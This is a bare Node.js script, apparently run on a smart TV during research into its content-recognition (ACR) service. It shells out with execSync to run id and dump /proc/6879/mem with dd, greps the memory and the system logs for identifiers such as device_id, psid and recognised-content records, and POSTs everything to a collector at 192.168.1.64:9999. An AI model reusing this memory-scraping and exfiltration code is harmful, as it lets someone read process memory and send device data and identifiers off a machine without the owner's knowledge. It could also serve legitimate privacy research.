"use strict";
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); });
    req.on("error", function (e) { console.log("post err " + e.message); });
    req.write(data); req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 60000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
out.id = sh("id");
out.maps_test = sh("ls -la /proc/6879/maps /proc/6879/mem 2>&1; echo ===; cat /proc/6879/maps 2>&1 | head -8");
out.dd_test = sh("dd if=/proc/6879/mem bs=4096 count=1 2>/dev/null | base64 | head -c 80");
out.dlog_any = sh("dlogutil -d -t 40 2>&1 | head -c 1500");
out.dlog_acr2 = sh("dlogutil -d -t 3000 2>&1 | grep -a -iE 'acr|ACRService|query|matchInfo|psid' | head -c 3000");

post("/acr58a", out);

var dump = {};
dump.started = out.started;
var maps = sh("cat /proc/6879/maps 2>/dev/null | grep ' rw' | head -40");
dump.maps = maps;
var regions = maps.split("\n");
var chunks = [];
for (var i = 0; i < regions.length && chunks.length < 25; i++) {
    var m = regions[i].match(/^([0-9a-f]+)-([0-9a-f]+)/);
    if (!m) continue;
    var start = parseInt(m[1], 16);
    var end = parseInt(m[2], 16);
    var pages = Math.min(16384, Math.floor((end - start) / 4096));
    if (pages < 1) continue;
    var skip = Math.floor(start / 4096);
    var cmd = "dd if=/proc/6879/mem bs=4096 skip=" + skip + " count=" + pages + " 2>/dev/null | grep -a -o -E '.{0,60}(device_id|recog_content|query_info|query_sum|fp_ver|uduration|tz_history|hdmi_info|matchInfo|contentId|sorconfigstring|firmware_version|ACR_MATCH|psid).{0,380}' | head -8";
    var r = sh(cmd, 6000);
    if (r && r.length > 3) chunks.push({ region: m[1] + "-" + m[2], data: r.slice(0, 5500) });
}
dump.hits = chunks;
post("/acr58b", dump);
post("/acr58_done", { started: out.started });
